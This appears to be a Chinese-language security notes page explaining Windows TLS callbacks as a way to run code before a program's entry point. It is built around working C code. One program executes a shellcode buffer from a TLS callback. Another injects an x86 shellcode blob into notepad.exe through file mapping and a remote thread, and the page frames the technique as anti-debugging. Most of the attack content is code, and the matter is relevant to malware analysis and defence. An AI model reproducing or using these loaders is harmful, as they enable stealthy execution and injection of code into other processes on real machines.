# TLS Code Execute

## TLS简介

> 线程局部存储（Thread Local Storage，TLS）用来将数据与一个正在执行的指定线程关联起来。
>
> 进程中的全局变量与函数内定义的静态\(static\)变量，是各个线程都可以访问的共享变量。在一个线程修改的内存内容，对所有线程都生效。这是一个优点也是一个缺点。说它是优点，线程的数据交换变得非常快捷。说它是缺点，一个线程死掉了，其它线程也性命不保; 多个线程访问共享数据，需要昂贵的同步开销，也容易造成同步相关的BUG。
>
> 如果需要在一个线程内部的各个函数调用都能访问、但其它线程不能访问的变量（被称为static memory local to a thread 线程局部静态变量），这就是TLS。

TLS提供了一个回调函数\(callback function\)，在线程程初始化和终止的时候都会调用，由于回调函数会在入口点\(EP\)前执行，而调试器通常会默认在主函数入口点main设置断点，所以常常被用来作为反调试手段使用，同时回调函数允许我们自由编写任意代码，TLS分为静态TLS和动态TLS，静态TLS会把TLS相关数据硬编码在PE文件内，在本篇文章内我们使用静态TLS来实现代码执行。

## 静态TLS

TLS回调函数遵循特殊的编写约定，与dll主函数相似。

```text
typedef VOID
(NTAPI *PIMAGE_TLS_CALLBACK) (
 PVOID DllHandle, 
 DWORD Reason, //Reason 遵循dll调用时相同的参数
 PVOID Reserved
 );
```

静态TLS存储在PE头IMAGE\_DATA\_DIRECTORY DataDirectory\[9\]的位置，同其他目录表数组一样，也是8字节结构 \(VA+Size\)，从TLS的VA处，可以找到该目录的详细信息。

```text
typedef struct _IMAGE_TLS_DIRECTORY32 {   //SIZE:0x18h
    DWORD   StartAddressOfRawData;
    DWORD   EndAddressOfRawData;
    DWORD   AddressOfIndex;             // PDWORD
    DWORD   AddressOfCallBacks;         // PIMAGE_TLS_CALLBACK *
    DWORD   SizeOfZeroFill;
    DWORD   Characteristics;
} IMAGE_TLS_DIRECTORY32;
typedef IMAGE_TLS_DIRECTORY32 * PIMAGE_TLS_DIRECTORY32;
```

## 代码实现

```text
#include <Windows.h>
#include <stdio.h>
#pragma comment(linker, "/section:.data,RWE") 

unsigned char buf[] ="shellcode";


VOID NTAPI TlsCallBack(PVOID DllHandle, DWORD dwReason, PVOID Reserved) 
//DllHandle模块句柄、Reason调用原因、 Reserved加载方式（显式/隐式）
{
	if (dwReason == DLL_PROCESS_ATTACH)
	{
		((void(WINAPI*)(void)) & buf)();
	}

}
//使用TLS需要在程序中新建一个.tls段专门存放TLS数据，申明使用
#pragma comment (linker, "/INCLUDE:__tls_used")
#pragma comment (linker, "/INCLUDE:__tls_callback")



#pragma data_seg (".CRT$XLB")
//.CRT表明是使用C RunTime机制，$后面的XLB中：X表示随机的标识
//L表示是TLS callback section，B可以被换成B到Y之间的任意一个字母，
//但是不能使用“.CRT$XLA”和“.CRT$XLZ”，因为“.CRT$XLA”和“.CRT$XLZ”是用于tlssup.obj的。
EXTERN_C PIMAGE_TLS_CALLBACK _tls_callback = TlsCallBack;
#pragma data_seg ()

int main()
{
	printf("ok");
	return 0;
}
```

## 扩展

由于TLS调用时通常已经初始化了所以进程相关信息\(DLL加载、PEB分配\)，所以理论上我们能在TLScallback函数内实现任意代码，理论上我们能在TLS实现其他任意技术,如在TLS回调函数内实现Mapping注入技术。

```text
#include <Windows.h>
#include <stdio.h>
#pragma comment(linker, "/section:.data,RWE") 
#pragma comment (lib, "OneCore.lib")
#include <Tlhelp32.h>

char shellcode[]=
"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b"
"\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b"
"\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24"
"\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
"\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0"
"\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c"
"\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a"
"\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
"\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f"
"\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52"
"\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33"
"\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89"
"\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
"\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67"
"\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3"
"\x68\x58\x20\x20\x20\x68\x4d\x53\x46\x21\x68\x72\x6f\x6d\x20"
"\x68\x6f\x2c\x20\x66\x68\x48\x65\x6c\x6c\x31\xc9\x88\x4c\x24"
"\x10\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff"
"\x55\x08";


DWORD pid;
VOID NTAPI TlsCallBack(PVOID DllHandle, DWORD dwReason, PVOID Reserved) 
{
	WCHAR lpszProcessName[] = L"notepad.exe";
	if (dwReason == DLL_PROCESS_ATTACH)
	{
		HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

		PROCESSENTRY32 pe;
		pe.dwSize = sizeof pe;

		if (Process32First(hSnapshot, &pe))
		{
			do {
				if (lstrcmpi(lpszProcessName, pe.szExeFile) == 0)
				{
					CloseHandle(hSnapshot);
					pid = pe.th32ProcessID;
					break;
				}
			} while (Process32Next(hSnapshot, &pe));
		}

		//
		HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(shellcode), NULL);

		LPVOID lpMapAddress = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, sizeof(shellcode));

		memcpy((PVOID)lpMapAddress, shellcode, sizeof(shellcode));



		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

		LPVOID lpMapAddressRemote = MapViewOfFile2(hMapping, hProcess, 0, NULL, 0, 0, PAGE_EXECUTE_READ);

		HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpMapAddressRemote, NULL, 0, NULL);

		UnmapViewOfFile(lpMapAddress);
		CloseHandle(hMapping);
	}

}

#pragma comment (linker, "/INCLUDE:__tls_used")
#pragma comment (linker, "/INCLUDE:__tls_callback")



#pragma data_seg (".CRT$XLB")
EXTERN_C PIMAGE_TLS_CALLBACK _tls_callback = TlsCallBack;
#pragma data_seg ()




int main()
{
	return 0;
}
```

x64的回调函数声明使用别的预处理指令

```text
EXTERN_C
#pragma const_seg (".CRT$XLB")
const PIMAGE_TLS_CALLBACK _tls_callback = TlsCallBackCheckDbugger;
#pragma const_seg ()
```

![](../.gitbook/assets/image%20%2889%29.png)

## LINKS

{% embed url="http://www.hackdig.com/?03/hack-2257.htm" %}

{% embed url="https://www.cnblogs.com/kuangke/p/7590657.html" %}

{% embed url="https://blog.csdn.net/hotspurs/article/details/90298636" %}

{% embed url="https://blog.csdn.net/qq\_18218335/article/details/69357016?utm\_medium=distribute.pc\_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&depth\_1-utm\_source=distribute.pc\_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase" %}





